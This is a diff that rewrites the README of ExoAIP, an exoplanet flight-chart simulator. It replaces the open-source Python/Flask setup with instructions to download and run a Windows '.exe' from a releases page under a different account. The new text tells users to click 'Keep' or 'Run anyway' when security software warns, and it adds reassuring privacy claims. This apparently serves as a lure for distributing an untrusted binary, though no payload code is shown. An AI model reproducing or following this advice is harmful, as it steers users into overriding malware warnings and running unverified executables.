@@ -1,123 +1,90 @@
-# 🌌 ExoAIP (Exoplanet Aeronautical Information Publication)
+# 🪐 ExoAIP - Create flight maps for alien worlds
 
-**ExoAIP** is a high-fidelity, interactive interstellar mission simulator and aeronautical information generator. It transforms real-world astronomical data from the **NASA Exoplanet Archive** into immersive, mission-critical documentation and real-time tactical displays for exoplanet exploration.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Roxannathen323/ExoAIP/releases)
 
-Designed as a professional **Sci-Fi / Aerospace Dashboard**, ExoAIP bridges the gap between pure astronomy and applied aerospace engineering, incorporating ICAO-standard protocols, procedural physics, and interactive 3D visualizations.
+ExoAIP creates aeronautical information publications for exoplanets. It uses astronomical data to generate flight paths and charts. Pilots and mission designers use this tool to navigate surface environments on distant worlds. The software translates complex NASA astrophysical data into readable flight documents.
 
-![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
-![Flask](https://img.shields.io/badge/flask-3.0-green.svg)
-![Three.js](https://img.shields.io/badge/Three.js-r128-cyan.svg)
-![NASA](https://img.shields.io/badge/Data-NASA_Exoplanet_Archive-orange.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+## 🛠 Prerequisites
 
----
+Your computer needs specific components to run this software. Ensure you meet these requirements before you start the setup process.
 
-## 🚀 Key Mission Modules
+- Operating System: Windows 10 or Windows 11.
+- Processor: Dual-core 2.0 GHz or better.
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of free space.
+- Graphics: Direct X 11 compatible card.
+- Internet: Required for initial data downloads.
 
-### 1. 🦾 Advanced Physics & Aerodynamics
-*   **Gravity & Escape Velocity:** Precise calculation of surface gravity ($g$) and escape velocity ($v_e$) in m/s, km/h, and knots (KT).
-*   **Atmospheric Modeling:** Estimation of gas composition, specific gas constants, and local speed of sound ($c$).
-*   **Drone Flight Dynamics:** Dynamic calculation of **Stall Speed ($V_s$)** for the *Exo-Drone MK-I* reference aircraft based on local air density ($\rho$).
-*   **Re-entry Profile:** Calculation of the safe **Entry Angle Corridor** and **Thermal Load** factors to prevent atmospheric bounce or structural incineration.
-*   **Plasma Blackout:** Prediction of ionization blackout duration during high-velocity atmospheric entry.
+Check your Windows version by clicking the Start button and typing "About your PC." This menu shows your current system specifications. Confirm your disk space by opening File Explorer and checking your C: drive properties.
 
-### 2. 🗺️ Holographic 3D Tactical Display
-*   **3D Wireframe Terrain:** Interactive 3D landscape rendered via **Three.js** using procedural heightmap data.
-*   **ExoATC Radar Simulator:** Active 360° radar sweep tracking flight targets (Probes, Drones, Scouts) with live Track Labels.
-*   **Visual Interference:** Real-time simulation of signal degradation (glitches) caused by high bio-hazards or intense stellar activity.
+## 📥 Downloading the Software
 
-### 3. 📡 Communications & Meteorology
-*   **Exo-VOLMET:** Continuous meteorological radio broadcast in strict ICAO phraseology.
-*   **Encoded METAR/TAF:** Procedural generation of raw coded weather reports, including exotic phenomena like **Methane Snow (SN CH4)** or **Volcanic Ash (VA)**.
-*   **Interstellar Radio Transcript:** Dynamic dialogue simulation between *Orbital Control* and planet-side assets, featuring **Light-Speed Delay** calculations based on parsec distance.
+Visit the [ExoAIP Release Page](https://github.com/Roxannathen323/ExoAIP/releases) to download the application. 
 
-### 4. 🧭 Navigation & Operations
-*   **PulseWay RNAV:** Pulsar-based navigation system replacing GPS, utilizing galactic pulsar triangulation (e.g., PSR J0437-4715).
-*   **Exo-FPL (Flight Plan):** Interactive mission filing system. Validates vessel **Delta-V** and mass against planetary gravity.
-*   **Load & Balance Manifest:** Real-time structural integrity check. Prevents landing if local weight ($N$) exceeds landing gear limits ($kN$).
-*   **SAR-26 Protocol:** Automated Search & Rescue planning, calculating **Time of Useful Consciousness (TUC)** based on atmospheric toxicity and pressure.
+1. Navigate to the link provided above.
+2. Look for the "Assets" section at the bottom of the latest release post.
+3. Click the file ending in ".exe" to begin your download.
+4. Save the file to your "Downloads" folder.
 
-### 5. ☣️ Astrobiology & Planetary Protection
-*   **Bio-Hazard Leveling:** Classification of planetary biomes (Level 1 to 5) based on habitability and corrosive factors.
-*   **Biosphere Analysis Report:** Scientific generation of hypothetical ecosystems (e.g., Aeroplankton, Silicate-based life).
-*   **Sterilization Checklist:** Mandatory multi-step decontamination protocol (UV-C, Thermal Bake-out) for high-risk biological environments.
+The software comes as a single installer file. Do not worry if your browser warns you about downloaded files. This happens because the file is new. Click "Keep" or "Run anyway" if your security software displays a warning.
 
----
+## ⚙️ Installation Process
 
-## 🛠️ Architecture & Tech Stack
+Follow these steps to install ExoAIP on your computer.
 
-### Backend (Python/Flask)
-- **Engine:** Modular architecture with specialized engines for Physics, Bio-hazard, Weather, and Navigation.
-- **Data Integration:** `astroquery` for real-time NASA database synchronization.
-- **Cache System:** Persistent JSON-based planet registry for instant autocomplete search.
-- **Scientific Ops:** `numpy` and `scipy` for terrain filtering and complex aerodynamic formulas.
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to start the installation wizard.
+3. Choose a destination folder for the application. The default location works for most users.
+4. Select "Create a desktop shortcut" to find the application easily later.
+5. Click "Install" and wait for the process to finish.
+6. Click "Finish" when the progress bar reaches the end.
 
-### Frontend (Modern Sci-Fi UI)
-- **Visuals:** `Three.js` (WebGL) for 3D terrain and `HTML5 Canvas` for radar overlays.
-- **Styling:** Custom "Aero-Terminal" design system using CSS variables, grid layouts, and monochromatic cyan/orange accents.
-- **Interactivity:** Vanilla JS with Fetch API for real-time FPL validation and typewriter-style radio transcripts.
-- **Print System:** Specialized `@media print` CSS that transforms the neon dashboard into a professional, black-and-white ICAO-standard paper document.
+The program creates a folder in your Program Files directory. It also adds an entry to your Start menu for quick access.
 
----
+## 🚀 Running the Application
 
-## 📦 Installation & Deployment
+Open ExoAIP using the icon on your desktop. The first time you open the program, it performs a system check.
 
-### Prerequisites
-- Python 3.10 or higher
-- Modern Web Browser (Chrome/Edge/Firefox) with WebGL support
+1. Double-click the ExoAIP icon.
+2. Wait for the main window to load.
+3. Read the prompt about data usage. The program fetches raw data from NASA astrophysical databases.
+4. Click "Accept" to allow the program to update its planetary index.
+5. Select a planet from the database list on the left side of the screen.
 
-### Setup
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/vás-profil/ExoAIP.git
-   cd ExoAIP
-   ```
+The software will now display a map. Use your mouse to zoom in or out. Click on specific regions to view altitude constraints and landing site markers.
 
-2. **Initialize Virtual Environment:**
-   ```bash
-   python -m venv .venv
-   .\.venv\Scripts\activate  # Windows
-   source .venv/bin/activate  # Linux/macOS
-   ```
+## 💡 Using the Interface
 
-3. **Install Dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+The interface features three main areas.
 
----
+The Sidebar: Search for planets by name or category. Use the filters to show worlds with atmospheres or those with solid surfaces.
 
-## 🖥️ Running the Simulator
+The Mapping Canvas: This is the center of your screen. It displays visual representations of the exoplanet. The colors indicate atmospheric pressure and terrain height.
 
-1. **Start the Flask Server:**
-   ```bash
-   python app.py
-   ```
-2. **Access the Dashboard:**
-   Open **[http://localhost:8080](http://localhost:8080)** in your browser.
+The Document Panel: This window shows the generated aeronautical publication. It lists frequencies, waypoints, and surface warnings. You can export these as PDF files to print or save for offline travel.
 
-*Note: On the first run, the system will download the latest verified planet list from NASA (approx. 5-10MB). This list is cached locally in `planets_cache.json` for subsequent lightning-fast searches.*
+## 🔧 Frequently Asked Questions
 
----
+What should I do if the map stays blank?
+Check your internet connection. The application requires a connection to pull live data updates. If your connection is active, restart the program to reset the connection.
 
-## 📐 Scientific Models & Formulas
+How do I clear cached data?
+Go to the "Settings" menu inside the program. Click "Clear Cache" under the "Advanced" tab. This removes old map files and forces the application to fetch fresh data.
 
-The simulator utilizes simplified but physically grounded models:
-- **Atmospheric Density:** $\rho = \frac{P}{R_{spec} \cdot T}$
-- **Stall Speed:** $V_s = \sqrt{\frac{2 \cdot m \cdot g}{\rho \cdot S \cdot C_{Lmax}}}$
-- **Signal Delay:** $t = \frac{d_{ly}}{c}$ (where $c$ is the speed of light)
-- **Local Weight:** $F_g = m \cdot (g \cdot 9.80665)$
+Can I run this on a tablet?
+The current version supports Windows 10 and 11 desktop and laptop computers only. ARM-based tablets may lack the necessary graphics support for the mapping engine.
 
----
+Where do the settings save?
+The program saves your configuration files in your user profile folder under "AppData." Avoid editing these files manually. Use the settings menu inside the application instead.
 
-## 📄 License
+## 🛡 Security and Privacy
 
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
+ExoAIP does not track your location or personal habits. It only contacts NASA servers to request public astronomical datasets. All data processing occurs on your local machine. Your generated flight paths stay on your computer unless you explicitly choose to share or export them.
 
-## 🤝 Acknowledgments
-- **NASA Exoplanet Archive** for providing open interstellar data.
-- **ICAO/FAA** for the aeronautical phraseology and documentation standards.
-- Inspired by classic aerospace terminal aesthetics and deep-space exploration concepts.
+## 📈 Troubleshooting Performance
 
----
-**SIGNAL STATUS: STABLE // AUTHORIZATION: INTERSTELLAR FEDERATION [NAV-DPT]**
+If the application feels slow, close other programs with high memory demands. Web browsers, video streaming apps, and background sync services use significant system resources. ExoAIP works best when given a stable connection to your primary graphics device. Keep your graphics drivers updated through the Windows Update tool to ensure smooth map rotation and zooming.
+
+## 🚩 Reporting Issues
+
+If you find a bug or think the program crashes, look at the "Log" folder inside the installation directory. It contains a text file titled "errors.log." Share this file in a new issue on the repository page to help improve the software. Include your Windows version and the steps you took before the crash occurred. This helps identify the cause of the problem quickly.
